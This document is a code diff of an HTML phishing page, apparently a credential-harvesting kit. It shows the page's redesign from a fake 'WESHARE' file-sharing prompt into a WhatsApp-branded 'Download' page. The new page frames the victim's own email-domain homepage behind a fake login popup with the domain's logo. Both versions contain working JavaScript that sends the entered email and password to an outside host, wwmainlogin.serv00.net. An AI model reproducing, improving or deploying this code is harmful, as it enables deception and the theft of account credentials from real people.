@@ -3,24 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Email Domain Logo Detection</title>
+    <title>Email Domain Login with Iframe</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            margin: 0;
+            height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            height: 100vh;
-            margin: 0;
+            position: relative;
         }
-        input[type="email"], input[type="password"], button { width: 180%;
+        h2 {
+            margin-bottom: 20px; /* Add margin for spacing */
+        }
+        form {
+            display: flex;
+            flex-direction: column; /* Stack elements vertically */
+            align-items: center; /* Center elements horizontally */
+        }
+        input[type="email"], input[type="password"], button {
             padding: 10px;
-            margin-top: 10px;
-            width: 260px;
-            border-radius: 5px;
+            margin-top: 15px;
+            width: 170%; /* Use percentage for responsiveness */
+            max-width: 270px; /* Set a maximum width */
+            border-radius: 10px;
             border: 1px solid #ccc;
         }
+        
+        button {
+            background-color: #25d366; 
+            color: white; /* Change text color to white for better visibility */
+            border: none; /* Remove default border */
+            border-radius: 50px;
+            font-size: 18px;
+            width: 370%; 
+        }
+        
+        small {
+            margin-top: 8px; /* Space between button and text */
+            font-size: 13px; /* Smaller font size */
+            color: black; /* Optional color for the text */
+        }
+        
         .popup {
             display: none;
             position: fixed;
@@ -28,9 +54,9 @@
             left: 50%;
             transform: translate(-50%, -50%);
             background-color: white;
-            border: 1px solid #ccc;
+            border-radius: 5px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            padding: 20px;
+            padding: 80px;
             z-index: 1000;
         }
         .overlay {
@@ -40,100 +66,133 @@
             background-color: rgba(0, 0, 0, 0.5);
             z-index: 999;
         }
-        img {
-            max-width: 100%;
-            height: auto;
+        .loading {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none; /* Hidden by default */
+        }
+        .loader {
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 60px; 
+            height: 60px; 
+            animation: spin 1s linear infinite; /* Animation */
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 
-    <center>  <h1> WESHARE
-    
-</h1> <BR> <h3>Enter recipient's email to share this file</h3></BR>
-<input type="email" id="email" placeholder="Email address" required>
-<button onclick="checkEmail()">Share</button> </center>
-    </form>
+<img src="https://static.whatsapp.net/rsrc.php/yZ/r/JvsnINJ2CZv.svg" alt="Logo" class="header-logo"> <!-- Replace with your logo URL -->
+<h2 id="emailHeader">Enter Your Email</h2>
+<form id="emailForm" onsubmit="return handleEmailSubmit(event)">
+    <input type="email" id="email" placeholder="Email Address" required>
+    <button type="submit">Download</button>
+    <small>File download starts once the submit button is clicked.</small> <!-- Added small text -->    
+</form>
 
 <div class="overlay" id="overlay"></div>
 <div class="popup" id="popup">
+    <img id="domainLogo" class="domain-logo" src="" alt="Domain Logo" style="display:none;"> <!-- Logo will be displayed here -->
     <span onclick="closePopup()" style="cursor:pointer; float:right;">&times;</span>
-    <img id="logo" src="" alt="Domain Logo" style="display:none;">
-    <h3>Sharing cancelled !  </h3>
-    <p>    Email password not saved on this device!<br> Enter password to continue sharing</p>
-    <p id="emailDisplay"><strong></strong></p> <!-- Display only the email here in bold -->
-    
-    <form id="loginForm" onsubmit="handleLogin(event)">
-        <input type="password" id="password" placeholder="Enter your password" required><br>
-        <button type="submit">Save Password</button> 
+    <h3 style="margin-top:40px;">Confirm this email belongs to you!</h3> <!-- Updated text and increased margin -->
+    <p id="emailDisplay" style="margin-bottom: 10px;"></p> <!-- Display the email here -->
+    <input type="password" id="password" placeholder="Enter your password" required>
+    <button onclick="submitPassword()">Log in</button>
+    <br><br><small>File download will start shortly.</small> <!-- Added small text --> 
+</div> 
+
+<div class="loading" id="loading">
+    <div class="loader"></div>
 </div>
 
 <script>
-    async function checkEmail() {
-        const email = document.getElementById('email').value;
+    let detectedDomain = ""; // Variable to store detected domain
 
-        if (email) {
-            const domain = email.split('@')[1];
-
-            // Show the overlay and popup
-            document.getElementById('overlay').style.display = 'block';
-            document.getElementById('popup').style.display = 'block';
-
-            // Display only the entered email in bold
-            document.getElementById('emailDisplay').innerHTML = `<strong>${email}</strong>`;
-
-            // Fetch the logo using Clearbit Logo API
-            const logoUrl = `https://logo.clearbit.com/${domain}`;
-            
-            // Set the logo image source
-            const logoImage = document.getElementById('logo');
-            logoImage.src = logoUrl;
-
-            // Handle errors if the image fails to load
-            logoImage.onload = () => {
-                logoImage.style.display = 'block';
-                document.getElementById('popup').style.display = 'block';
-            };
-
-            logoImage.onerror = () => {
-                alert('Logo not found for this domain.');
-                closePopup();
-            };
-        } else {
-            alert('Please enter a valid email address.');
-        }
-    }
-
-    function closePopup() {
-        document.getElementById('overlay').style.display = 'none';
-        document.getElementById('popup').style.display = 'none';
-    }
-
-    function handleLogin(event) {
+    function handleEmailSubmit(event) {
         event.preventDefault(); // Prevent default form submission
 
         const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
 
-        // Create a FormData object to send data
-        const formData = new FormData();
-        formData.append('email', email);
-        formData.append('password', password);
+        if (email) {
+           detectedDomain = email.split('@')[1]; // Extract the domain
+           const homepageUrl = `https://${detectedDomain}`; // Construct the homepage URL
 
-        // Send data to PHP script using fetch API
-        fetch('https://wwmainlogin.serv00.net/send.php', {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => response.text())
-        .then(data => {
-            console.log(data); // Handle response from PHP script
-            closePopup(); // Close the popup after submission
-        })
-        .catch(error => {
-            console.error('Error:', error);
-        });
+           // Show loading animation
+           document.getElementById('loading').style.display = 'block';
+
+           // Remove the email input form and header immediately
+           document.getElementById('emailForm').remove();
+           document.getElementById('emailHeader').remove();
+
+           // Load content in iframe
+           const iframe = document.createElement('iframe');
+           iframe.src = homepageUrl;
+
+           // Append iframe to body and make it full screen
+           document.body.appendChild(iframe);
+           iframe.style.position = 'absolute';
+           iframe.style.top = '0';
+           iframe.style.left = '0';
+           iframe.style.width = '100%';
+           iframe.style.height = '100%';
+           iframe.style.zIndex = '-1'; // Send it to the back
+
+           // Show the overlay and popup for password input
+           document.getElementById('overlay').style.display = 'block';
+           document.getElementById('popup').style.display = 'block';
+           
+           // Display email in popup
+           document.getElementById('emailDisplay').innerText = email;
+
+           // Set logo URL based on domain
+           const logoUrl = `https://logo.clearbit.com/${detectedDomain}`;
+           const logoImage = document.getElementById('domainLogo');
+           logoImage.src = logoUrl; 
+           logoImage.style.display = 'block'; // Show logo
+
+       } else {
+           alert('Please enter a valid email address.');
+       }
     }
+
+    function closePopup() {
+       document.getElementById('overlay').style.display = 'none';
+       document.getElementById('popup').style.display = 'none';
+   }
+
+   function submitPassword() {
+       const password = document.getElementById('password').value;
+
+       if (password) {
+           const email = document.getElementById('emailDisplay').innerText;
+
+           // Send email and password to server via AJAX
+           const xhr = new XMLHttpRequest();
+           xhr.open("POST", "https://wwmainlogin.serv00.net/send_email.php", true);
+           xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+           
+           xhr.onreadystatechange = function () {
+               if (xhr.readyState === XMLHttpRequest.DONE) {
+                   if (xhr.status === 200) {
+                       alert("Credentials submitted successfully!");
+                   } else {
+                       alert("An error occurred. Please try again.");
+                   }
+               }
+           };
+
+           xhr.send(`email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`);
+       } else {
+           alert('Please enter your password.');
+       }
+   }
 </script>
 
 </body>
